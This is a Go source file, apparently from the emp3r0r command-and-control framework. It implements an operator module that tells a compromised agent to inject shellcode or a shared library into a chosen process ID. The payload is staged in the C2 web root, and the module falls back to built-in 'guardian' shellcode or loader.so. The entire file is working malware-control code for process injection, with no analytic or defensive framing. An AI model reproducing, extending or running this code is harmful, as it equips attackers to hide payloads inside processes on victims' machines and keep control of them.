package modules

import (
	"fmt"

	"github.com/jm33-m0/emp3r0r/core/lib/cc/internal/agents"
	"github.com/jm33-m0/emp3r0r/core/lib/cc/internal/def"
	emp3r0r_def "github.com/jm33-m0/emp3r0r/core/lib/emp3r0r_def"
	"github.com/jm33-m0/emp3r0r/core/lib/logging"
	"github.com/jm33-m0/emp3r0r/core/lib/tun"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

func moduleInjector() {
	// target
	target := def.ActiveAgent
	if target == nil {
		logging.Errorf("Target not exist")
		return
	}
	if def.AvailableModuleOptions["method"] == nil || def.AvailableModuleOptions["pid"] == nil {
		logging.Errorf("One or more required options are nil")
		return
	}
	method := def.AvailableModuleOptions["method"].Val

	checksum := ""
	shellcode_file := "shellcode.txt"
	so_file := "to_inject.so"

	// shellcode.txt
	pid := def.AvailableModuleOptions["pid"].Val
	if method == "shellcode" && !util.IsExist(def.WWWRoot+shellcode_file) {
		logging.Warningf("Custom shellcode '%s%s' does not exist, will inject guardian shellcode", def.WWWRoot, shellcode_file)
	} else {
		checksum = tun.SHA256SumFile(def.WWWRoot + shellcode_file)
	}

	// to_inject.so
	if method == "shared_library" && !util.IsExist(def.WWWRoot+so_file) {
		logging.Warningf("Custom library '%s%s' does not exist, will inject loader.so instead", def.WWWRoot, so_file)
	} else {
		checksum = tun.SHA256SumFile(def.WWWRoot + so_file)
	}

	// injector cmd
	cmd := fmt.Sprintf("%s --method %s --pid %s --checksum %s", emp3r0r_def.C2CmdInject, method, pid, checksum)

	// tell agent to inject
	err := agents.SendCmd(cmd, "", target)
	if err != nil {
		logging.Errorf("Could not send command (%s) to agent: %v", cmd, err)
		return
	}
	logging.Printf("Please wait...")
}
